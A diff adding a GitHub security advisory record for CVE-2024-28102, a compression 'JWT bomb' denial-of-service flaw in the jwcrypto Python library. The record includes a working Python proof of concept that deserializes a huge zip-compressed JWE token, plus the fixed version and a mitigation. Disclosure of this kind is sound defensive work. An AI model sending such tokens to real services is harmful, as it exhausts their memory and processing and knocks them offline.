@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-j857-7rvv-vj97",
+  "modified": "2024-03-21T18:29:26Z",
+  "published": "2024-03-06T20:00:56Z",
+  "aliases": [
+    "CVE-2024-28102"
+  ],
+  "summary": "JWCrypto vulnerable to JWT bomb Attack in `deserialize` function",
+  "details": "## Affected version\nVendor: https://github.com/latchset/jwcrypto\nVersion: 1.5.5\n\n## Description\nAn attacker can cause a DoS attack by passing in a malicious JWE Token with a high compression ratio.\nWhen the server processes this Token, it will consume a lot of memory and processing time.\n\n## Poc\n```python\nfrom jwcrypto import jwk, jwe\nfrom jwcrypto.common import json_encode, json_decode\nimport time\npublic_key = jwk.JWK()\nprivate_key = jwk.JWK.generate(kty='RSA', size=2048)\npublic_key.import_key(**json_decode(private_key.export_public()))\n\n\npayload = '{\"u\": \"' + \"u\" * 400000000 + '\", \"uu\":\"' + \"u\" * 400000000 + '\"}'\nprotected_header = {\n    \"alg\": \"RSA-OAEP-256\",\n    \"enc\": \"A256CBC-HS512\",\n    \"typ\": \"JWE\",\n    \"zip\": \"DEF\",\n    \"kid\": public_key.thumbprint(),\n}\njwetoken = jwe.JWE(payload.encode('utf-8'),\n                   recipient=public_key,\n                   protected=protected_header)\nenc = jwetoken.serialize(compact=True)\n\nprint(\"-----uncompress-----\")\n\nprint(len(enc))\n\nbegin = time.time()\n\njwetoken = jwe.JWE()\njwetoken.deserialize(enc, key=private_key)\n\nprint(time.time() - begin)\n\nprint(\"-----compress-----\")\n\npayload = '{\"u\": \"' + \"u\" * 400000 + '\", \"uu\":\"' + \"u\" * 400000 + '\"}'\nprotected_header = {\n    \"alg\": \"RSA-OAEP-256\",\n    \"enc\": \"A256CBC-HS512\",\n    \"typ\": \"JWE\",\n    \"kid\": public_key.thumbprint(),\n}\njwetoken = jwe.JWE(payload.encode('utf-8'),\n                   recipient=public_key,\n                   protected=protected_header)\nenc = jwetoken.serialize(compact=True)\n\nprint(len(enc))\n\nbegin = time.time()\n\njwetoken = jwe.JWE()\njwetoken.deserialize(enc, key=private_key)\n\nprint(time.time() - begin)\n```\nIt can be found that when processing Tokens with similar lengths, the processing time of compressed tokens is significantly longer.\n<img width=\"172\" alt=\"image\" src=\"https://github.com/latchset/jwcrypto/assets/133195620/23193327-3cd7-499a-b5aa-28c56af92785\">\n\n\n\n## Mitigation\nTo mitigate this vulnerability, it is recommended to limit the maximum token length to 250K. This approach has also\nbeen adopted by the JWT library System.IdentityModel.Tokens.Jwt used in Microsoft Azure [1], effectively preventing\nattackers from exploiting this vulnerability with high compression ratio tokens.\n\n## References\n[1] [CVE-2024-21319](https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/security/advisories/GHSA-8g9c-28fc-mcx2)\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "jwcrypto"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.5.5"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/latchset/jwcrypto/security/advisories/GHSA-j857-7rvv-vj97"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28102"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/latchset/jwcrypto/commit/90477a3b6e73da69740e00b8161f53fea19b831f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/latchset/jwcrypto"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-770"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-06T20:00:56Z",
+    "nvd_published_at": "2024-03-21T02:52:23Z"
+  }
+}
